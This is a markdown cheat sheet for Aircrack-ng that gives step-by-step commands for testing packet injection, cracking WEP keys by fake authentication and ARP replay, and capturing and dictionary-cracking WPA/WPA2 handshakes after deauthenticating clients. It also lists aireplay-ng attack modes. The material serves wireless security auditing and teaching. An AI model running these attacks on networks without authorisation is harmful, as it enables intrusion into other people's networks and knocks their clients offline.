# Aircrack-ng :
   * [Injection test](https://www.aircrack-ng.org/doku.php?id=injection_test)
     ##### The injection test determines if your card can successfully inject and determine the ping response times to the Access Point (AP)
      ```bash
         iwconfig # List wireless interfaces
         airmon-ng start wlan0 8 # Start the wireless interface in monitor mode on a specific AP channel
         aireplay-ng -9 -e teddy -a 00:14:6C:7E:40:80 wlan0mon # Test the injection capability of the wireless device to the AP
      ```
   ## WEP crack
   * [Flowchart : Wep Cracking](http://www.aircrack-ng.org/img/simple-wep-crack.gif)
   * [Crack WEP (with client)](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack) (fake authentication combined with ARP request replay technique)
    
     * List wireless interfaces
       * **iwconfig**
     * Start the wireless interface in monitor mode on the specific AP channel
       *  **airmon-ng start wlan0**
     * Show available AP
       * **airodump-ng wlan0mon**
     * Start airodump-ng to capture the IVs
       * **airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output wlan0mon**
     * Use aireplay-ng to do a fake authentication with the access point (To associate with an access point)
       * **aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon**
     * Start aireplay-ng in ARP request replay mode to inject packets
       * **aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon**
     * Run aircrack-ng to crack key using the IVs collected
       * **aircrack-ng -b 00:14:6C:7E:40:80 output*.cap**

   * [Crack WEP (without client)](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)

  # WAP crack
  
   * Crack WPA/WPA2 pre-shared key
     * Start airodump-ng to collect authentication handshake
       * **airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0mon**
     * Use aireplay-ng to deauthenticate the wireless client
       * **aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon**
     * Run aircrack-ng to crack the pre-shared key
       * **aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap**

  # WPS crack pin

   * [The upper data block shows the access points found](https://www.aircrack-ng.org/doku.php?id=newbie_guide)

      Name | Description
      ------------ | -------------
      **BSSID**   |	The MAC address of the AP|
      **PWR**     |	Signal strength. Some drivers don't report it|
      **Beacons** |	Number of beacon frames received. If you don't have a signal strength you can estimate it by the number of beacons: the more beacons, the better the signal quality|
      **Data** 	|Number of data frames received|
      **CH** 	    |Channel the AP is operating on|
      **MB**      |	Speed or AP Mode. 11 is pure 802.11b, 54 pure 802.11g. Values between are a mixture|
      **ENC**     |	Encryption: OPN: no encryption, WEP: WEP encryption, WPA: WPA or WPA2 encryption, WEP?: WEP or WPA (don't know yet)|
      **ESSID**   |	The network name. Sometimes hidden |

   * [The lower data block shows the clients found](https://www.aircrack-ng.org/doku.php?id=newbie_guide) 

      Name | Description
      ------------ | -------------
      | **BSSID**   | The MAC of the AP this client is associated to |
      | **STATION** | The MAC of the client itself |
      | **PWR**     | Signal strength. Some drivers don't report it  |
      | **Packets** | Number of data frames received  |
      | **Probes**  | Network names (ESSIDs) this client has probed |

   * [different attacks](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)

     * **--deauth count** : deauthenticate 1 or all stations (-0)
     * **--fakeauth delay** : fake authentication with AP (-1)
     * **--interactive** : interactive frame selection (-2)
     * **--arpreplay** : standard ARP-request replay (-3)
     * **--chopchop** : decrypt/chopchop WEP packet (-4)
     * **--fragment** : generates valid keystream (-5)
     * **--caffe-latte** : query a client for new IVs (-6)
     * **--cfrag** : fragments against a client (-7)
     * **--test** : tests injection and quality (-9)
     
     
